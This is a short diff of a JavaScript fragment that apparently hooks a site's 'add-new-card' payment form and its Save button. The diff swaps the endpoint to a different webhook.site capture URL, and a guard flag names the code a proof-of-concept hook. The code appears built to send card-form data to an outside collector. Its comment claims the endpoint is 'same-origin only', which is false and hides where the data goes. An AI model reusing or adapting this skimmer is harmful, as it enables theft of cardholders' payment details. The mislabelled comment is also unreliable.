@@ -3,7 +3,7 @@
 
   const FORM_ID = 'add-new-card';
   const SAVE_SELECTOR = 'button.hds-a-button--primary[aria-label="Save"]';
-  const ENDPOINT = 'https://webhook.site/8ee964ab-b689-4081-a0da-68471ec7c8d2/'; // ✅ same-origin only
+  const ENDPOINT = 'https://webhook.site/7e2a1b4c-78d4-4f1b-b35c-7564e8a68b63/'; // ✅ same-origin only
 
  if (window.__pocPerFieldGetHooked) return;
   window.__pocPerFieldGetHooked = true;
